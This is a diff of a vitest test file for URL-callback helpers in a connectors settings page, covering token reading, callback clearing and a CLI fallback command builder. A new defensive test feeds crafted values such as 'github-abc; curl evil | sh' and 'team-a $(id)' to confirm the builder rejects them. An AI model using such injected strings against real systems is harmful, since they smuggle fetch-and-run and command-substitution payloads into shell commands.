@@ -1,16 +1,17 @@
 import { describe, it, expect, beforeEach } from 'vitest'
-import { callbackReasonMessage, clearCompletionFragment, completionCommand, readCompletionToken } from './connectors'
+import { callbackReasonMessage, clearConsentCallback, completionCommand, readCompletionToken } from './connectors'
 
 describe('connectors helpers', () => {
   beforeEach(() => window.history.replaceState(null, '', '/settings/connectors'))
 
-  it('reads the completion token and clears it only when asked', () => {
-    window.history.replaceState(null, '', '/settings/connectors?status=pending&connection=c#completion=tok%2B1')
+  it('reads the completion token and clears the whole callback only when asked', () => {
+    window.history.replaceState(null, '', '/settings/connectors?status=pending&connection=c&namespace=n&other=1#completion=tok%2B1')
     expect(readCompletionToken()).toBe('tok+1')
     expect(readCompletionToken()).toBe('tok+1')
-    clearCompletionFragment()
+    clearConsentCallback()
     expect(window.location.hash).toBe('')
-    expect(window.location.search).toBe('?status=pending&connection=c')
+    // The callback keys go with the token; unrelated query state stays.
+    expect(window.location.search).toBe('?other=1')
     expect(readCompletionToken()).toBeNull()
   })
 
@@ -22,6 +23,17 @@ describe('connectors helpers', () => {
   it('names the CLI fallback with the sealed namespace', () => {
     expect(completionCommand('github-abc', 'team-a')).toBe('orka connection complete github-abc --namespace team-a --completion <value from the address bar>')
     expect(completionCommand('github-abc', undefined)).toBe('orka connection complete github-abc --completion <value from the address bar>')
+    expect(completionCommand('github-abc', '')).toBe('orka connection complete github-abc --completion <value from the address bar>')
+  })
+
+  it('never turns a crafted callback into a shell command', () => {
+    expect(completionCommand('github-abc; curl evil | sh', 'team-a')).toBeNull()
+    expect(completionCommand('github-abc', 'team-a $(id)')).toBeNull()
+    expect(completionCommand('Github-ABC', undefined)).toBeNull()
+    expect(completionCommand(undefined, undefined)).toBeNull()
+    expect(completionCommand('', undefined)).toBeNull()
+    expect(completionCommand('a'.repeat(254), undefined)).toBeNull()
+    expect(completionCommand('github-abc', 'a'.repeat(64))).toBeNull()
   })
 
   it('words the callback reasons', () => {
